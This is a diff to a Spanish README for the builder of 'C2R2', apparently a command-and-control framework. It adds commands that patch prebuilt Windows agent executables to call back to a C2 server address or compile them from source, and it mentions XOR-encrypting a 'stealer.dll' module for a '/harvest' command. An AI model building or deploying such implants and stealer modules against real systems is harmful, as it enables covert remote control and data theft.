@@ -2,6 +2,66 @@
 
 Generador de agentes y módulos para C2R2.
 
+## ⚡ NUEVO: Binary Patching (v2.0+)
+
+**¡Ya no necesitas Rust para configurar agentes!**
+
+El builder ahora puede **parchear binarios pre-compilados** para cambiar la IP del servidor sin recompilar:
+
+```bash
+# Configurar un agente existente con nueva IP
+./builder patch-agent --input agent/agent.exe --output mi_agente.exe --server 192.168.1.201:4444
+```
+
+✅ **Perfecto para distribución a clientes** que solo necesitan configurar la IP.
+
+Ver [USAGE.md](USAGE.md) para documentación completa.
+
+## ⚠️ IMPORTANTE - Dos Formas de Usar el Builder
+
+### 🎯 Opción 1: Parchear Binario (Recomendado para Usuarios Finales)
+
+**Para:** Usuarios que descargaron un release de GitHub
+
+```bash
+./builder patch-agent \
+    --input agent/agent.exe \
+    --output configured_agent.exe \
+    --server 192.168.1.100:4444
+```
+
+**Ventajas:**
+- No requiere Rust
+- No requiere MinGW
+- Funciona en cualquier plataforma
+- Configuración en segundos
+
+### 🛠️ Opción 2: Compilar desde Código Fuente
+
+**Para:** Desarrolladores con código fuente completo
+
+```bash
+./builder build-agent \
+    --name mi_agente \
+    --server 192.168.1.100:4444 \
+    --production
+```
+
+**Requisitos:**
+- Código fuente completo
+- Rust + MinGW instalados
+- Target Windows instalado
+
+---
+
+## ⚠️ Nota para Distribución
+
+- ✅ **Recomendado**: Usar `build-all.ps1` en Windows (compila todo automáticamente)
+- ✅ **Alternativa**: Builder en Linux x86_64 con Rust + MinGW instalado
+- ❌ **NO usar**: `build-agent` en Raspberry Pi ARM64 (usar `patch-agent` en su lugar)
+
+**Si estás en Raspberry Pi**: Usa `patch-agent` con el agente pre-compilado del release.
+
 ## 🎯 Funcionalidad
 
 El builder tiene dos comandos principales:
@@ -23,6 +83,8 @@ Encripta `stealer.dll` con XOR y lo prepara para ser usado con `/harvest`:
 - Guarda `c2r2-server/modules/stealer.enc` y `stealer.key`
 
 ## 📋 Prerequisitos
+
+**Solo necesario si quieres compilar manualmente (no recomendado - usa build-all.ps1):**
 
 ### Instalar MinGW-w64 (cross-compilation para Windows)
 
